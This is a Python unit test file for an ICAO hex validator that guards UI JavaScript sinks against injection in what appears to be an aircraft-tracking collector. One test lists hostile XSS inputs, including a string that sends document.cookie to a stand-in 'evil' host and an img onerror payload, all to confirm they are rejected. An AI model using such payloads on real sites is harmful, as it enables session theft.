"""Tests for clean_icao_hex — the ingest-time ICAO hex validator that is a
security boundary (the hex is later interpolated into onclick JS-string and
element-id sinks in the UI, so a malformed/hostile value must never get through).
See collector.clean_icao_hex (added v3.4.84)."""

import unittest

from collector import clean_icao_hex


class TestCleanIcaoHex(unittest.TestCase):
    def test_normal_hex_passes(self):
        self.assertEqual(clean_icao_hex("A835D2"), "A835D2")

    def test_lowercase_is_uppercased(self):
        self.assertEqual(clean_icao_hex("a835d2"), "A835D2")

    def test_whitespace_is_stripped(self):
        self.assertEqual(clean_icao_hex("  a835d2 "), "A835D2")

    def test_pseudo_tisb_prefix_survives(self):
        # dump1090 prefixes synthetic TIS-B/MLAT targets with '~' — these are
        # legitimate and tracked, so they must NOT be dropped.
        self.assertEqual(clean_icao_hex("~AC82EC"), "~AC82EC")

    def test_xss_payload_is_rejected(self):
        # The whole point: a hostile feed cannot smuggle a script-breaking hex.
        for payload in (
            "');fetch('//evil/?c='+document.cookie);//",
            "<img src=x onerror=alert(1)>",
            "A835D2'",
            "A835D2\"",
            "A835D2);alert(1",
        ):
            self.assertEqual(clean_icao_hex(payload), "", payload)

    def test_wrong_length_rejected(self):
        self.assertEqual(clean_icao_hex("A835D"), "")
        self.assertEqual(clean_icao_hex("A835D22"), "")
        self.assertEqual(clean_icao_hex("~A835D"), "")

    def test_non_hex_rejected(self):
        self.assertEqual(clean_icao_hex("ZZZZZZ"), "")
        self.assertEqual(clean_icao_hex("G835D2"), "")

    def test_non_string_and_empty_rejected(self):
        for bad in (None, 123, "", "   ", [], {}):
            self.assertEqual(clean_icao_hex(bad), "", repr(bad))


if __name__ == "__main__":
    unittest.main()
